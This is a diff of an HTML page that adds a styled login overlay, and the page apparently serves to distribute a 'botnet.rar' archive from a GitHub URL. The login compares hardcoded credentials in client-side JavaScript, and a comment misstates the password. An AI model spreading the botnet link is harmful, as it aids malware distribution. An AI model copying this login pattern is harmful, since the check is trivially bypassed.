@@ -113,9 +113,9 @@
             inset: 0;
             background: #000;
             z-index: 2000;
-            display: flex;
-            align-items: center; /* Căn giữa theo chiều dọc */
-            justify-content: center; /* Căn giữa theo chiều ngang */
+            display: none; /* Ban đầu ẩn để hiện Login */
+            align-items: center; 
+            justify-content: center; 
             transition: clip-path 1.2s cubic-bezier(0.8, 0, 0.2, 1);
             clip-path: circle(150% at 50% 50%);
         }
@@ -123,11 +123,99 @@
         .hide-splash {
             clip-path: circle(0% at 50% 50%) !important;
         }
+
+        /* --- PHẦN ĐĂNG NHẬP MỚI (ĐẸP NHẤT) --- */
+        #login-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 3000;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-box {
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 30, 86, 0.3);
+            padding: 40px;
+            border-radius: 32px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(255, 30, 86, 0.1);
+        }
+        .login-box h2 {
+            font-size: 24px;
+            font-weight: 900;
+            letter-spacing: 4px;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary);
+        }
+        .input-group input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 14px 14px 14px 45px;
+            border-radius: 12px;
+            color: white;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-group input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(255, 30, 86, 0.2);
+        }
+        .login-btn {
+            width: 100%;
+            background: var(--primary);
+            padding: 16px;
+            border-radius: 12px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            transition: 0.4s;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            box-shadow: 0 0 25px var(--primary);
+            transform: translateY(-2px);
+        }
     </style>
 </head>
 <body>
 
     <div class="mesh-bg"></div>
+
+    <div id="login-overlay">
+        <div class="login-box">
+            <div class="mb-6">
+                <i class="fas fa-user-lock text-5xl text-red-600"></i>
+            </div>
+            <h2>Security <span class="text-red-600">Login</span></h2>
+            <div class="input-group">
+                <i class="fas fa-user"></i>
+                <input type="text" id="username" placeholder="Username" autocomplete="off">
+            </div>
+            <div class="input-group">
+                <i class="fas fa-key"></i>
+                <input type="password" id="password" placeholder="Password">
+            </div>
+            <button onclick="checkAuth()" class="login-btn">Verify Identity</button>
+            <p id="error" class="text-red-500 text-xs mt-4 opacity-0 transition-opacity">Thông tin không chính xác!</p>
+        </div>
+    </div>
 
     <div id="splash">
         <div class="text-center flex flex-col items-center">
@@ -198,12 +286,30 @@
     <script>
         const GITHUB_SOURCE = "https://github.com/minhfansubdev/botnet/raw/refs/heads/main/botnet.rar";
 
-        window.onload = () => {
+        // Tài khoản: admin | Mật khẩu: 123
+        function checkAuth() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            const err = document.getElementById('error');
+            
+            if(u === "admin" && p === "6122014") {
+                document.getElementById('login-overlay').style.display = 'none';
+                startOriginalFlow();
+            } else {
+                err.style.opacity = '1';
+                setTimeout(() => err.style.opacity = '0', 2000);
+            }
+        }
+
+        // Kích hoạt luồng gốc (Splash -> Main)
+        function startOriginalFlow() {
+            const splash = document.getElementById('splash');
+            splash.style.display = 'flex';
             setTimeout(() => {
-                document.getElementById('splash').classList.add('hide-splash');
+                splash.classList.add('hide-splash');
                 startTypingEffect();
             }, 3000);
-        };
+        }
 
         function startTypingEffect() {
             const text = ">> Secure Protocol Established. Ready for deployment...";
